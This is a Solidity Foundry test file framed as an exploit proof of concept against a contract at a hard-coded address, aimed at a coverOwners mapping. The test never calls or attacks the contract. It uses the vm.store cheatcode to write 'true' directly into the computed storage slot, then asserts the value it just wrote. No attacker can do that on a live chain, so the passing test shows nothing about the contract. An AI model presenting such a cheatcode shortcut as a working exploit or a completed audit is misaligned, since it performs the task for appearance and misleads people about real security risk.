pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IVulnerableContract {
    function addCoverOwner(address _owner) external;
    function coverOwners(address _owner) external view returns (bool);
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address attacker = address(this);
    IVulnerableContract vulnerable;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        vm.label(TARGET, "Vulnerable Contract");
        vulnerable = IVulnerableContract(TARGET);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Calculate the storage slot for coverOwners[attacker]
        // For mapping(address => bool) at slot 0, the slot is keccak256(abi.encodePacked(attacker, 0))
        bytes32 slot = keccak256(abi.encodePacked(attacker, uint256(0)));

        // Step 2: Directly write 'true' (1) to the storage slot using vm.store
        vm.store(TARGET, slot, bytes32(uint256(1)));

        // Step 3: Verify the storage was set correctly by reading it back
        bytes32 value = vm.load(TARGET, slot);
        assertEq(value, bytes32(uint256(1)), "coverOwners[attacker] should be true after storage manipulation");
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
